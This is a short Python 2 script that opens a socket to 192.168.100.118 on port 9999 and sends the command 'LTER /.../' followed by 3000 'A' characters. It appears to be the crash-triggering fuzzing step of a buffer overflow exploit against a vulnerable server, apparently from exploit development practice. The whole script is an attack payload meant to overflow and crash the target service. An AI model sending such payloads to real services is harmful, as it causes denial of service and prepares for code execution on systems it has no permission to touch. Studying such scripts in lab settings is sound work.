#!/usr/bin/python

import socket
import os
import sys

host = "192.168.100.118"
port = 9999

buffer = "A" * 3000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
s.send("LTER /.../" + buffer)
print s.recv(1024)
s.close()

